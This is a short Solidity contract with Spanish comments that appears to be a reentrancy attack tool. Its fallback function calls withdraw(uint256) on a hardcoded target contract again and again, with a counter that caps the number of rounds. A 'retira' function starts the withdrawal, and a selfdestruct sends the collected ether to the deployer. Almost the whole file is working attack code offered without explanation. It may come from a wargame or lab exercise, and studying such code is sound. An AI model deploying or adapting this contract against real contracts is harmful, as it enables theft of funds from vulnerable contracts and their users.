pragma solidity ^0.4.18;

contract entrada {
    
    address public dir_yo = msg.sender;
    address public target = 0xe4490aeaa687a07dd0f82877c4321fc1f52be34b;
    address public esteContrato = this;
    uint8 public cont;
    bool public activ = true;

    // guardo la direccion del target desde un input
    function direccion(address _target) public {
        target = _target;
    }
    
    function pagointermedio() public payable {
    //    esteContrato.transfer(_amount);
    }
    
    
    // mato el mensajero
    function destroy() public { 
        selfdestruct(dir_yo);
    }
    
    function check_balance() public view returns (uint) {
      return esteContrato.balance;
    }
    
    function reset() public {
        cont = 0;
    }
    
    function act_switch() public {
        activ = !activ;
    }
    
    function retira(uint _amount) public {
        if(target.call(bytes4(keccak256("withdraw(uint256)")), _amount)){}
    }
    
    function () public payable {
        if(activ && cont == 2) {
            return;
        }
        
        cont++;
        if(target.call(bytes4(keccak256("withdraw(uint256)")), 1)){}
        //if(target.call(bytes4(keccak256("withdraw(uint)")), 1)){}
    }
}
